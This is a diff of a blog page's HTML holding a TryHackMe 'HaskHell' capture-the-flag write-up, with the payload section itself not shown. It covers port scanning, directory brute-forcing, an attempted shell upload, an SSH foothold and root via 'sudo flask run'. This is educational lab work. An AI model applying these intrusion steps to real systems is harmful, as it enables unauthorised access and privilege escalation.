+0 2 -24 4 -53 4 -40 0 -58 -5 -70 -18z"/>
+<path d="M1680 661 c-19 -37 -13 -42 53 -39 59 3 62 4 65 31 3 27 2 27 -52 27
+-44 0 -57 -4 -66 -19z"/>
+<path d="M1842 668 c-7 -7 -12 -20 -12 -30 0 -14 9 -18 38 -19 l37 -2 -43 -7
+c-45 -7 -62 -21 -62 -53 0 -16 8 -18 61 -15 69 3 94 22 72 56 -9 15 -7 21 8
+30 10 7 19 21 19 32 0 17 -7 20 -53 20 -29 0 -58 -5 -65 -12z"/>
+<path d="M1990 666 c0 -8 -3 -21 -6 -30 -5 -14 4 -16 60 -16 50 0 66 3 66 14
+0 8 3 21 6 30 5 14 -4 16 -60 16 -50 0 -66 -3 -66 -14z"/>
+<path d="M2146 664 c-15 -39 -8 -44 59 -44 l65 0 0 30 c0 30 0 30 -59 30 -44
+0 -60 -4 -65 -16z"/>
+<path d="M2300 650 l0 -30 60 0 60 0 0 30 0 30 -60 0 -60 0 0 -30z"/>
+<path d="M2460 650 c0 -30 0 -30 58 -30 32 0 61 2 64 5 3 3 3 17 0 30 -4 23
+-8 25 -63 25 -59 0 -59 0 -59 -30z"/>
+<path d="M2612 653 c3 -27 5 -28 66 -31 l63 -3 -3 28 c-3 27 -5 28 -66 31
+l-63 3 3 -28z"/>
+<path d="M2770 650 l0 -30 65 0 c67 0 74 5 59 44 -5 12 -21 16 -65 16 -59 0
+-59 0 -59 -30z"/>
+<path d="M3080 669 c0 -21 21 -49 38 -49 15 -1 16 -2 1 -13 -22 -17 -8 -53 27
+-69 25 -12 26 -13 6 -18 -19 -5 -20 -7 -7 -37 13 -31 17 -33 64 -33 64 0 80 7
+74 31 -7 27 -41 49 -78 50 -30 2 -29 2 5 8 28 5 34 10 32 26 -6 31 -22 45 -56
+46 -30 2 -30 2 -3 6 29 5 37 29 15 51 -15 15 -118 16 -118 1z"/>
+<path d="M3237 659 c3 -11 17 -27 30 -36 17 -12 21 -18 12 -24 -10 -6 -10 -13
+-1 -33 11 -24 17 -26 72 -26 65 0 72 8 44 48 -10 15 -26 22 -52 24 -37 1 -37
+1 -4 5 34 5 38 13 22 44 -9 15 -22 19 -69 19 -55 0 -59 -2 -54 -21z"/>
+<path d="M1486 588 c-29 -41 -21 -48 49 -48 61 0 65 1 71 26 8 33 -7 44 -63
+44 -32 0 -46 -5 -57 -22z"/>
+<path d="M1658 599 c-10 -5 -18 -21 -18 -34 0 -24 3 -25 60 -25 56 0 61 2 71
+27 7 20 6 28 -3 35 -18 11 -89 9 -110 -3z"/>
+<path d="M1982 598 c-5 -7 -12 -22 -14 -33 -3 -18 3 -20 62 -20 l65 0 3 33 3
+32 -54 0 c-32 0 -59 -5 -65 -12z"/>
+<path d="M2142 598 c-7 -7 -12 -22 -12 -35 0 -22 4 -23 65 -23 57 0 65 2 65
+19 0 11 3 26 6 35 5 14 -3 16 -53 16 -33 0 -64 -5 -71 -12z"/>
+<path d="M2633 603 c-7 -2 -13 -18 -13 -34 l0 -29 65 0 c61 0 65 1 65 23 0 13
+-5 28 -12 35 -12 12 -81 15 -105 5z"/>
+<path d="M2791 601 c-18 -11 2 -49 32 -60 26 -10 85 -3 93 11 3 5 -2 20 -10
+33 -13 20 -25 25 -59 25 -23 0 -48 -4 -56 -9z"/>
+<path d="M2947 603 c-9 -15 12 -52 35 -64 23 -13 23 -13 2 -18 -18 -5 -19 -10
+-12 -38 9 -33 9 -33 73 -33 56 0 65 3 65 18 0 29 -23 53 -60 62 l-35 8 33 1
+c25 1 32 5 32 20 0 33 -28 51 -80 51 -27 0 -51 -3 -53 -7z"/>
+<path d="M2292 573 c3 -27 6 -28 66 -31 l62 -3 0 31 0 30 -66 0 -65 0 3 -27z"/>
+<path d="M2460 570 l0 -30 65 0 65 0 0 30 0 30 -65 0 -65 0 0 -30z"/>
+<path d="M1462 524 c-11 -5 -42 -55 -42 -69 0 -3 30 -5 67 -3 61 3 69 5 82 30
+9 15 12 30 8 34 -9 9 -98 15 -115 8z"/>
+<path d="M1620 510 c-11 -11 -20 -29 -20 -40 0 -19 5 -21 62 -18 56 3 64 6 77
+30 9 15 13 29 11 31 -3 2 -28 7 -57 11 -45 6 -55 4 -73 -14z"/>
+<path d="M1789 509 c-11 -11 -19 -28 -19 -39 0 -18 7 -20 60 -20 52 0 62 3 76
+25 24 36 14 46 -45 50 -42 2 -58 -2 -72 -16z"/>
+<path d="M3324 523 c-17 -3 -21 -9 -16 -26 9 -40 22 -47 89 -47 62 0 64 1 57
+23 -15 52 -51 66 -130 50z"/>
+<path d="M1946 498 c-12 -46 -9 -48 59 -48 61 0 66 2 75 26 16 42 13 44 -59
+44 -63 0 -69 -2 -75 -22z"/>
+<path d="M2116 498 c-12 -46 -9 -48 63 -48 63 0 69 2 75 23 12 45 9 47 -63 47
+-63 0 -69 -2 -75 -22z"/>
+<path d="M2288 490 c-3 -17 -2 -32 0 -35 3 -3 34 -5 69 -5 l63 0 0 35 0 35
+-64 0 c-63 0 -64 0 -68 -30z"/>
+<path d="M2462 488 l3 -33 68 -3 68 -3 -3 33 -3 33 -68 3 -68 3 3 -33z"/>
+<path d="M2629 488 c7 -33 7 -33 74 -36 61 -3 67 -1 67 17 0 45 -9 51 -80 51
+l-67 0 6 -32z"/>
+<path d="M2796 493 c10 -43 11 -43 80 -43 56 0 64 2 64 19 0 45 -9 51 -81 51
+l-69 0 6 -27z"/>
+<path d="M2197 393 c-3 -5 -8 -41 -12 -80 l-7 -73 262 0 263 0 -7 71 c-3 39
+-9 75 -12 80 -6 11 -481 12 -487 2z"/>
+</g>
+</svg>
+<a title="Cyber-Sec blogs, HackTheBox writeup's, Tryhackme writeup's, Vulnhub witeup's, Portfolio.
+" href="/">D3c0deZ3r0</a></div><button class="button button--secondary button--circle search-button js-search-toggle"><i class="fas fa-search"></i></button></div><nav class="navigation">
+        <ul><li class="navigation__item"><a href="/archive.html">Archive</a></li><li class="navigation__item"><a href="/about.html">About</a></li><li class="navigation__item"><a href="/Machines.html">Machines</a></li><li><button class="button button--secondary button--circle search-button js-search-toggle"><i class="fas fa-search"></i></button></li></ul>
+      </nav></div>
+  </header>
+</div><div class="page__content"><div class ="main"><div class="grid grid--reverse">
 
+              <div class="col-aside d-print-none js-col-aside"><aside class="page__aside js-page-aside"><div class="toc-aside js-toc-root"></div>
+</aside></div>
 
+              <div class="col-main cell cell--auto"><!-- start custom main top snippet -->
 
+<!-- end custom main top snippet -->
+<article itemscope itemtype="http://schema.org/Article"><div class="article__header"><header><h1>Tryhackme Haskhell</h1></header><span class="split-space">&nbsp;</span>
+          <a class="edit-on-github"
+            title="Edit on Github"
+            href="https://github.com/user_name/repo_name/tree/master/_posts/2020-07-08-Haskhell.md">
+            <i class="far fa-edit"></i></a></div><meta itemprop="headline" content="Tryhackme Haskhell"><div class="article__info clearfix"><ul class="left-col menu"><li>
+              <a class="button button--secondary button--pill button--sm"
+                href="/archive.html?tag=linux">linux</a>
+            </li><li>
+              <a class="button button--secondary button--pill button--sm"
+                href="/archive.html?tag=gobuster">gobuster</a>
+            </li><li>
+              <a class="button button--secondary button--pill button--sm"
+                href="/archive.html?tag=boot2root">boot2root</a>
+            </li></ul><ul class="right-col menu"><li><i class="fas fa-user"></i> <span>Jeevan</span></li><li><i class="far fa-calendar-alt"></i> <span>Jul 08, 2020</span>
+            </li></ul></div><meta itemprop="author" content="Jeevan"/><meta itemprop="datePublished" content="2020-07-08T15:04:00+05:30">
+    <meta itemprop="keywords" content="linux,gobuster,boot2root"><div class="js-article-content"><div class="layout--article"><!-- start custom article top snippet -->
 
-
-
-
-
-<header class="post-header">
-  <h1 class="post-title p-name" itemprop="name headline">Tryhackme Haskhell</h1>
-  <h3 class="post-subtitle"></h3>
-
-  <p class="post-meta">
-    <time class="dt-published" datetime="2020-07-08T15:04:00+05:30" itemprop="datePublished"><i class="fa fa-calendar"></i> Jul 08, 2020
-    </time>
-    
-    <img src="/assets/img/sample/hask/hask.png">
-    
-    
-    
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-    <span class="post-reading-time left-vsplit"><i class="fa fa-clock-o"></i> About 8 mins</span>
-  </p>
-<div class="post-tags">
-<a class="post-tag" href="/tags.html#linux">#linux</a><a class="post-tag" href="/tags.html#gobuster">#gobuster</a><a class="post-tag" href="/tags.html#boot2root">#boot2root</a>
-</div></header>
-<article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
-
-    <div class="post-content e-content" itemprop="articleBody">
-
-      <h2 id="lets-get-started">Let’s get started</h2>
+<!-- end custom article top snippet -->
+<div class="article__content" itemprop="articleBody"><p><img src="/assets/img/sample/hask/hask.png" alt="" /></p>
+<blockquote>
+  <p>HaskHell is medium level machine in TryHackMe. It is based on uploading unrestricted file uploads and exploiting it.</p>
+</blockquote>
 
 <h2 id="nmap-scan">Nmap Scan.</h2>
 
@@ -610,13 +530,13 @@ function googleTranslateElementInit() {
 <span class="no">PORT</span>     <span class="no">STATE</span> <span class="no">SERVICE</span> <span class="no">VERSION</span>
 <span class="mi">22</span><span class="o">/</span><span class="n">tcp</span>   <span class="nb">open</span>  <span class="n">ssh</span>     <span class="no">OpenSSH</span> <span class="mf">7.6</span><span class="n">p1</span> <span class="no">Ubuntu</span> <span class="mi">4</span><span class="n">ubuntu0</span><span class="o">.</span><span class="mi">3</span> <span class="p">(</span><span class="no">Ubuntu</span> <span class="no">Linux</span><span class="p">;</span> <span class="n">protocol</span> <span class="mf">2.0</span><span class="p">)</span>
 <span class="o">|</span> <span class="n">ssh</span><span class="o">-</span><span class="ss">hostkey: 
-</span><span class="o">|</span>   <span class="mi">2048</span> <span class="mi">1</span><span class="n">d</span><span class="ss">:f3</span><span class="p">:</span><span class="mi">53</span><span class="ss">:f7</span><span class="p">:</span><span class="mi">6</span><span class="n">d</span><span class="p">:</span><span class="mi">5</span><span class="n">b</span><span class="ss">\:a1\:d4</span><span class="p">:</span><span class="mi">84</span><span class="p">:</span><span class="mi">51</span><span class="p">:</span><span class="mi">0</span><span class="n">d</span><span class="ss">:dd</span><span class="p">:</span><span class="mi">66</span><span class="p">:</span><span class="mi">40</span><span class="p">:</span><span class="mi">4</span><span class="n">d</span><span class="p">:</span><span class="mi">90</span> <span class="p">(</span><span class="no">RSA</span><span class="p">)</span>
-<span class="o">|</span>   <span class="mi">256</span> <span class="mi">26</span><span class="p">:</span><span class="mi">7</span><span class="n">c</span><span class="ss">:bd</span><span class="p">:</span><span class="mi">33</span><span class="p">:</span><span class="mi">8</span><span class="n">f</span><span class="ss">:bf</span><span class="p">:</span><span class="mi">09</span><span class="ss">:ac</span><span class="p">:</span><span class="mi">9</span><span class="n">e</span><span class="ss">\:e3\:d3</span><span class="p">:</span><span class="mi">0</span><span class="n">a</span><span class="ss">:c3</span><span class="p">:</span><span class="mi">34</span><span class="ss">:bc</span><span class="p">:</span><span class="mi">14</span> <span class="p">(</span><span class="no">ECDSA</span><span class="p">)</span>
-<span class="o">|</span><span class="n">_</span>  <span class="mi">256</span> <span class="n">d5</span><span class="ss">:fb</span><span class="p">:</span><span class="mi">55</span><span class="ss">\:a0\:fd\:e8\:e1:ab</span><span class="p">:</span><span class="mi">9</span><span class="n">e</span><span class="p">:</span><span class="mi">46</span><span class="ss">\:af\:b8</span><span class="p">:</span><span class="mi">71</span><span class="p">:</span><span class="mi">90</span><span class="p">:</span><span class="mo">00</span><span class="p">:</span><span class="mi">26</span> <span class="p">(</span><span class="no">ED25519</span><span class="p">)</span>
+</span><span class="o">|</span>   <span class="mi">2048</span> <span class="mi">1</span><span class="n">d</span><span class="ss">:f3</span><span class="p">:</span><span class="mi">53</span><span class="ss">:f7</span><span class="p">:</span><span class="mi">6</span><span class="n">d</span><span class="p">:</span><span class="mi">5</span><span class="n">b</span><span class="ss">:a1:d4</span><span class="p">:</span><span class="mi">84</span><span class="p">:</span><span class="mi">51</span><span class="p">:</span><span class="mi">0</span><span class="n">d</span><span class="ss">:dd</span><span class="p">:</span><span class="mi">66</span><span class="p">:</span><span class="mi">40</span><span class="p">:</span><span class="mi">4</span><span class="n">d</span><span class="p">:</span><span class="mi">90</span> <span class="p">(</span><span class="no">RSA</span><span class="p">)</span>
+<span class="o">|</span>   <span class="mi">256</span> <span class="mi">26</span><span class="p">:</span><span class="mi">7</span><span class="n">c</span><span class="ss">:bd</span><span class="p">:</span><span class="mi">33</span><span class="p">:</span><span class="mi">8</span><span class="n">f</span><span class="ss">:bf</span><span class="p">:</span><span class="mi">09</span><span class="ss">:ac</span><span class="p">:</span><span class="mi">9</span><span class="n">e</span><span class="ss">:e3:d3</span><span class="p">:</span><span class="mi">0</span><span class="n">a</span><span class="ss">:c3</span><span class="p">:</span><span class="mi">34</span><span class="ss">:bc</span><span class="p">:</span><span class="mi">14</span> <span class="p">(</span><span class="no">ECDSA</span><span class="p">)</span>
+<span class="o">|</span><span class="n">_</span>  <span class="mi">256</span> <span class="n">d5</span><span class="ss">:fb</span><span class="p">:</span><span class="mi">55</span><span class="ss">:a0:fd:e8:e1:ab</span><span class="p">:</span><span class="mi">9</span><span class="n">e</span><span class="p">:</span><span class="mi">46</span><span class="ss">:af:b8</span><span class="p">:</span><span class="mi">71</span><span class="p">:</span><span class="mi">90</span><span class="p">:</span><span class="mo">00</span><span class="p">:</span><span class="mi">26</span> <span class="p">(</span><span class="no">ED25519</span><span class="p">)</span>
 <span class="mi">5001</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">http</span>    <span class="no">Gunicorn</span> <span class="mf">19.7</span><span class="o">.</span><span class="mi">1</span>
 <span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="n">server</span><span class="o">-</span><span class="ss">header: </span><span class="n">gunicorn</span><span class="o">/</span><span class="mf">19.7</span><span class="o">.</span><span class="mi">1</span>
 <span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="ss">title: </span><span class="no">Homepage</span>
-<span class="no">Service</span> <span class="no">Info</span><span class="p">:</span> <span class="no">OS</span><span class="p">:</span> <span class="no">Linux</span><span class="p">;</span> <span class="no">CPE</span><span class="p">:</span> <span class="n">cpe</span><span class="ss">:/</span><span class="n">o</span><span class="ss">\:linux\:linux_kernel</span>
+<span class="no">Service</span> <span class="no">Info</span><span class="p">:</span> <span class="no">OS</span><span class="p">:</span> <span class="no">Linux</span><span class="p">;</span> <span class="no">CPE</span><span class="p">:</span> <span class="n">cpe</span><span class="ss">:/</span><span class="n">o</span><span class="ss">:linux:linux_kernel</span>
 
 <span class="no">Service</span> <span class="n">detection</span> <span class="n">performed</span><span class="o">.</span> <span class="no">Please</span> <span class="n">report</span> <span class="n">any</span> <span class="n">incorrect</span> <span class="n">results</span> <span class="n">at</span> <span class="n">https</span><span class="ss">:/</span><span class="o">/</span><span class="n">nmap</span><span class="p">.</span><span class="nf">org</span><span class="o">/</span><span class="n">submit</span><span class="o">/</span> <span class="o">.</span>
 <span class="no">Nmap</span> <span class="ss">done: </span><span class="mi">1</span> <span class="no">IP</span> <span class="n">address</span> <span class="p">(</span><span class="mi">1</span> <span class="n">host</span> <span class="n">up</span><span class="p">)</span> <span class="n">scanned</span> <span class="k">in</span> <span class="mf">657.29</span> <span class="n">seconds</span>
@@ -626,15 +546,15 @@ function googleTranslateElementInit() {
 
 <p>Having a look on the http site @ 5001 I come to see this page</p>
 
-<p><img src="/assets/img/sample/hask/hask1.jpg" alt=""></p>
+<p><img src="/assets/img/sample/hask/hask1.jpg" alt="" /></p>
 
 <p>Seeing the hyperlink <code class="language-plaintext highlighter-rouge">homework here</code> I clicked on it and it took me to the page where an assignment can be submitted.</p>
 
-<p><img src="/assets/img/sample/hask/hask2.png" alt=""></p>
+<p><img src="/assets/img/sample/hask/hask2.png" alt="" /></p>
 
 <h3 id="clicking-on-the-submit-button-it-says-that-page-not-found">Clicking on the submit button it says that <code class="language-plaintext highlighter-rouge">PAGE NOT FOUND</code>.</h3>
 
-<p><img src="/assets/img/sample/hask/hask3.png" alt=""></p>
+<p><img src="/assets/img/sample/hask/hask3.png" alt="" /></p>
 
 <p>Using <code class="language-plaintext highlighter-rouge">Gobuster</code> to find the directories of the machine.</p>
 
@@ -652,11 +572,11 @@ by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> &amp; 
 <span class="o">[</span>+] User Agent:     gobuster/3.0.1
 <span class="o">[</span>+] Timeout:        10s
 <span class="o">===============================================================</span>
-2020/07/08 03\:33\:08 Starting gobuster
+2020/07/08 03:33:08 Starting gobuster
 <span class="o">===============================================================</span>
 /submit <span class="o">(</span>Status: 200<span class="o">)</span>
 <span class="o">===============================================================</span>
-2020/07/08 03\:36\:03 Finished
+2020/07/08 03:36:03 Finished
 <span class="o">===============================================================</span>
 </code></pre></div></div>
 
@@ -664,7 +584,7 @@ by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> &amp; 
 
 <h3 id="tried-a-bunch-of-stuff-like-uploading-a-php-shell-and-stuff-like-that-but-nothing-seems-to-be-working">Tried a bunch of stuff like uploading a <code class="language-plaintext highlighter-rouge">PHP</code> shell and stuff like that, but nothing seems to be working.</h3>
 
-<p><img src="/assets/img/sample/hask/hask4.png" alt=""></p>
+<p><img src="/assets/img/sample/hask/hask4.png" alt="" /></p>
 
 <h3 id="remembering-from-previous-pages-this-site-probably-accepts-a-haskell-scripts">Remembering from previous pages this site probably accepts a haskell scripts.</h3>
 
@@ -755,7 +675,7 @@ Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-101-generic x86_64)
  * Management:     https://landscape.canonical.com
  * Support:        https://ubuntu.com/advantage
 
-  System information as of Wed Jul  8 08\:06\:37 UTC 2020
+  System information as of Wed Jul  8 08:06:37 UTC 2020
 
   System load:  0.0                Processes:           108
   Usage of /:   26.3% of 19.56GB   Users logged in:     0
@@ -767,7 +687,7 @@ Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-101-generic x86_64)
 0 updates are security updates.
 
 
-Last login: Wed May 27 18\:45\:06 2020 from 192.168.126.128
+Last login: Wed May 27 18:45:06 2020 from 192.168.126.128
 $ id
 uid=1002(prof) gid=1002(prof) groups=1002(prof)
 </span></code></pre></div></div>
@@ -782,8 +702,7 @@ prof@haskhell:~$
 
 </code></pre></div></div>
 
-<h2 id="checking-the-priv-of-prof">Checking the priv of <code class="language-plaintext highlighter-rouge">prof</code>
-</h2>
+<h2 id="checking-the-priv-of-prof">Checking the priv of <code class="language-plaintext highlighter-rouge">prof</code></h2>
 
 <div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>prof@haskhell:~<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
 Matching Defaults entries <span class="k">for </span>prof on haskhell:
@@ -808,170 +727,658 @@ prof@haskhell:~<span class="nv">$ </span><span class="nb">sudo </span>flask run
 flag<span class="o">{</span><span class="k">*****************</span><span class="o">}</span>
 </code></pre></div></div>
 
-<p>If you like my work, please do consider giving me +rep on HACKTHEBOX.<br>
+<p>If you like my work, please do consider giving me +rep on HACKTHEBOX.<br />
 My HackTheBox profile: <a href="https://www.hackthebox.eu/home/users/profile/291968">https://www.hackthebox.eu/home/users/profile/291968</a></p>
 
+</div><section class="article__sharing d-print-none"></section><div class="d-print-none"><footer class="article__footer"><meta itemprop="dateModified" content="2020-07-08T15:04:00+05:30"><!-- start custom article footer snippet -->
 
+<!-- end custom article footer snippet -->
+<div class="article__subscribe"><div class="subscribe"><i class="fas fa-rss"></i> <a type="application/rss+xml" href="/feed.xml">Subscribe</a></div>
+</div><div class="article__license"><div class="license">
+    </p>
+  </div></div><p style="color:DodgerBlue;">HTB Badge :P</p>
+  <p></p>
+  >>>
+  <img src="http://www.hackthebox.eu/badge/image/291968" alt="Hack The Box">
+  >>>
+</footer>
+<div class="article__section-navigator clearfix"><div class="previous"><span>PREVIOUS</span><a href="/hackthebox/retired/2020/07/06/Tabby.html">HackTheBox Tabby</a></div><div class="next"><span>NEXT</span><a href="/hackthebox/retired/2020/07/11/Blackfield.html">Hackthebox Blackfiled</a></div></div></div>
 
-    </div>
-
-</article>
-<div class="post-nav">
-<a class="previous" href="/hackthebox/2020/07/06/Tabby.html" title="HackTheBox Tabby">HackTheBox Tabby</a><a class="next" href="/hackthebox/2020/07/11/Blackfield.html" title="Hackthebox Blackfiled">Hackthebox Blackfiled</a>
-</div>
-<div class="post-related">
-      <div>Related Articles</div>
-      <ul>
-        <li><a class="post-link" href="/hackthebox/retired/2020/03/13/Bashed.html" title="Hackthebox Blackfiled">HackTheBox Bashed</a></li>
-<li><a class="post-link" href="/hackthebox/2021/03/29/Armageddon.html" title="Hackthebox Blackfiled">HackTheBox Armageddon"</a></li>
-<li><a class="post-link" href="/hackthebox/retired/2020/06/12/Monteverde.html" title="Hackthebox Blackfiled">HackTheBox Monteverde</a></li>
-<li><a class="post-link" href="/hackthebox/2020/07/06/Tabby.html" title="Hackthebox Blackfiled">HackTheBox Tabby</a></li>
-</ul>
-    </div>
-<div class="post-comments"></div></section>
 </div>
 
+<script>(function() {
+  var SOURCES = window.TEXT_VARIABLES.sources;
+  window.Lazyload.js(SOURCES.jquery, function() {
+    $(function() {
+      var $this ,$scroll;
+      var $articleContent = $('.js-article-content');
+      var hasSidebar = $('.js-page-root').hasClass('layout--page--sidebar');
+      var scroll = hasSidebar ? '.js-page-main' : 'html, body';
+      $scroll = $(scroll);
 
-  </section>
-  <section class="sidebar" style="margin-left: 15px;">
-    <!-- Get sidebar items --><style type="text/css" media="screen">
-.post-menu ul {
-  list-style: none;
-  padding: 0;
-  margin: 0;
-}
-</style>
-
-<div class="post-menu">
-  <div class="post-menu-title"> Contents</div>
-  <div class="post-menu-content"></div>
-</div>
-
-<script>
-  function generateContent() {
-    var menu = document.querySelector(".post-menu");
-    var menuContent =  menu.querySelector(".post-menu-content");
-    var headings = document.querySelector(".post-content").querySelectorAll("h2, h3, h4, h5, h6");
-
-    // Hide menu when no headings
-    if (headings.length === 0) {
-      return menu.style.display = "none";
-    }
-
-    // Generate post menu
-    var menuHTML = '';
-    for (var i = 0; i < headings.length; i++) {
-      var h = headings[i];
-      menuHTML += (
-        '<li class="h-' + h.tagName.toLowerCase() + '">'
-        + '<a href="#h-' + h.getAttribute('id') + '">' + h.textContent + '</a></li>');
-    }
-
-    menuContent.innerHTML = '<ul>' + menuHTML + '</ul>';
-
-    // The header element
-    var header = document.querySelector('header.site-header');
-
-    function doMenuCollapse(index, over_items) {
-      var items = menuContent.firstChild.children;
-
-      if (over_items == undefined) {
-        over_items = 20;
-      }
-
-      if (items.length < over_items) {
-        return;
-      }
-
-      var activeItem = items[index];
-      var beginItem = activeItem
-      var endItem = activeItem
-      var beginIndex = index;
-      var endIndex = index + 1;
-      while (beginIndex >= 0
-        && !items[beginIndex].classList.contains('h-h2')) {
-        beginIndex -= 1;
-      }
-      while (endIndex < items.length
-        && !items[endIndex].classList.contains('h-h2')) {
-        endIndex += 1;
-      }
-      for (var i = 0; i < beginIndex; i++) {
-        item = items[i]
-        if (!item.classList.contains('h-h2')) {
-          item.style.display = 'none';
-        }
-      }
-      for (var i = beginIndex + 1; i < endIndex; i++) {
-        item = items[i]
-        // if (!item.classList.contains('h-h2')) {
-          item.style.display = '';
-        // }
-      }
-      for (var i = endIndex; i < items.length; i++) {
-        item = items[i]
-        if (!item.classList.contains('h-h2')) {
-          item.style.display = 'none';
-        }
-      }
-    }
-
-    // Init menu collapsed
-    doMenuCollapse(-1);
-
-    // Active the menu item
-    window.addEventListener('scroll', function (event) {
-      var lastActive = menuContent.querySelector('.active');
-      var changed = true;
-      var activeIndex = -1;
-      for (var i = headings.length - 1; i >= 0; i--) {
-        var h = headings[i];
-        var headingRect = h.getBoundingClientRect();
-        var headerRect = header.getBoundingClientRect();
-        var headerTop = Math.floor(headerRect.top);
-        var headerHeight = Math.floor(headerRect.height);
-        var headerHeight = headerTop + headerHeight + 20;
-        if (headingRect.top <= headerHeight) {
-          var id = 'h-' + h.getAttribute('id');
-          var a = menuContent.querySelector('a[href="#' + id  + '"]');
-          var curActive = a.parentNode;
-          if (curActive) {
-            curActive.classList.add('active');
-            activeIndex = i;
-          }
-          if (lastActive == curActive) {
-            changed = false;
-          }
-          break;
-        }
-      }
-      if (changed) {
-        if (lastActive) {
-          lastActive.classList.remove('active');
-        }
-        doMenuCollapse(activeIndex);
-      }
-      event.preventDefault();
+      $articleContent.find('.highlight').each(function() {
+        $this = $(this);
+        $this.attr('data-lang', $this.find('code').attr('data-lang'));
+      });
+      $articleContent.find('h1[id], h2[id], h3[id], h4[id], h5[id], h6[id]').each(function() {
+        $this = $(this);
+        $this.append($('<a class="anchor d-print-none" aria-hidden="true"></a>').html('<i class="fas fa-anchor"></i>'));
+      });
+      $articleContent.on('click', '.anchor', function() {
+        $scroll.scrollToAnchor('#' + $(this).parent().attr('id'), 400);
+      });
     });
-  }
-  generateContent();
+  });
+})();
 </script>
-</section>
+</div><section class="page__comments d-print-none"></section></article><!-- start custom main bottom snippet -->
+
+<!-- end custom main bottom snippet -->
 </div>
-
+            </div></div></div><div class="page__footer d-print-none">
+<footer class="footer py-4 js-page-footer">
+  <div class="main"><div itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Jeevan"><meta itemprop="url" content="/"><meta itemprop="description" content="HACKER	||	PENETRATION TESTER	||	CTF PLAYER	||	BLOGGER || INDEPENDENT RESEARCHER."><div class="footer__author-links"><div class="author-links">
+  <ul class="menu menu--nowrap menu--inline"></ul>
+</div>
+</div>
+    </div><div class="site-info mt-2">
+      <div>© D3c0deZ3r0 2021,
+        Powered by <a title="Jekyll is a simple, blog-aware, static site generator." href="http://jekyllrb.com/">Jekyll</a> 
       </div>
-    </main><footer class="site-footer h-card">
-  <data class="u-url" href="/"></data>
-
-  <div class="wrapper">
-    <div class="site-footer-inner">
-      <div>Copyright © 2020-2022 @Jeevan</div>
-      <div>Powered by <a title="Jekyll is a simple, blog-aware, static site
-      generator." href="http://jekyllrb.com/">Jekyll</a> &amp; <a title="Yat, yet
-      another theme." href="https://github.com/jeffreytse/jekyll-theme-yat">Yat Theme</a>.</div>
-      
     </div>
   </div>
 </footer>
-</body>
+</div></div>
+    </div><script>(function() {
+  var SOURCES = window.TEXT_VARIABLES.sources;
+  window.Lazyload.js(SOURCES.jquery, function() {
+    var $body = $('body'), $window = $(window);
+    var $pageRoot = $('.js-page-root'), $pageMain = $('.js-page-main');
+    var activeCount = 0;
+    function modal(options) {
+      var $root = this, visible, onChange, hideWhenWindowScroll = false;
+      var scrollTop;
+      function setOptions(options) {
+        var _options = options || {};
+        visible = _options.initialVisible === undefined ? false : show;
+        onChange = _options.onChange;
+        hideWhenWindowScroll = _options.hideWhenWindowScroll;
+      }
+      function init() {
+        setState(visible);
+      }
+      function setState(isShow) {
+        if (isShow === visible) {
+          return;
+        }
+        visible = isShow;
+        if (visible) {
+          activeCount++;
+          scrollTop = $(window).scrollTop() || $pageMain.scrollTop();
+          $root.addClass('modal--show');
+          $pageMain.scrollTop(scrollTop);
+          activeCount === 1 && ($pageRoot.addClass('show-modal'), $body.addClass('of-hidden'));
+          hideWhenWindowScroll && window.hasEvent('touchstart') && $window.on('scroll', hide);
+          $window.on('keyup', handleKeyup);
+        } else {
+          activeCount > 0 && activeCount--;
+          $root.removeClass('modal--show');
+          $window.scrollTop(scrollTop);
+          activeCount === 0 && ($pageRoot.removeClass('show-modal'), $body.removeClass('of-hidden'));
+          hideWhenWindowScroll && window.hasEvent('touchstart') && $window.off('scroll', hide);
+          $window.off('keyup', handleKeyup);
+        }
+        onChange && onChange(visible);
+      }
+      function show() {
+        setState(true);
+      }
+      function hide() {
+        setState(false);
+      }
+      function handleKeyup(e) {
+        // Char Code: 27  ESC
+        if (e.which ===  27) {
+          hide();
+        }
+      }
+      setOptions(options);
+      init();
+      return {
+        show: show,
+        hide: hide,
+        $el: $root
+      };
+    }
+    $.fn.modal = modal;
+  });
+})();
+</script><div class="modal modal--overflow page__search-modal d-print-none js-page-search-modal"><script>
+(function () {
+  var SOURCES = window.TEXT_VARIABLES.sources;
+  window.Lazyload.js(SOURCES.jquery, function() {
+    // search panel
+    var search = (window.search || (window.search = {}));
+    var useDefaultSearchBox = window.useDefaultSearchBox === undefined ?
+      true : window.useDefaultSearchBox ;
+
+    var $searchModal = $('.js-page-search-modal');
+    var $searchToggle = $('.js-search-toggle');
+    var searchModal = $searchModal.modal({ onChange: handleModalChange, hideWhenWindowScroll: true });
+    var modalVisible = false;
+    search.searchModal = searchModal;
+
+    var $searchBox = null;
+    var $searchInput = null;
+    var $searchClear = null;
+
+    function getModalVisible() {
+      return modalVisible;
+    }
+    search.getModalVisible = getModalVisible;
+
+    function handleModalChange(visible) {
+      modalVisible = visible;
+      if (visible) {
+        search.onShow && search.onShow();
+        useDefaultSearchBox && $searchInput[0] && $searchInput[0].focus();
+      } else {
+        search.onShow && search.onHide();
+        useDefaultSearchBox && $searchInput[0] && $searchInput[0].blur();
+        setTimeout(function() {
+          useDefaultSearchBox && ($searchInput.val(''), $searchBox.removeClass('not-empty'));
+          search.clear && search.clear();
+          window.pageAsideAffix && window.pageAsideAffix.refresh();
+        }, 400);
+      }
+    }
+
+    $searchToggle.on('click', function() {
+      modalVisible ? searchModal.hide() : searchModal.show();
+    });
+    // Char Code: 83  S, 191 /
+    $(window).on('keyup', function(e) {
+      if (!modalVisible && !window.isFormElement(e.target || e.srcElement) && (e.which === 83 || e.which === 191)) {
+        modalVisible || searchModal.show();
+      }
+    });
+
+    if (useDefaultSearchBox) {
+      $searchBox = $('.js-search-box');
+      $searchInput = $searchBox.children('input');
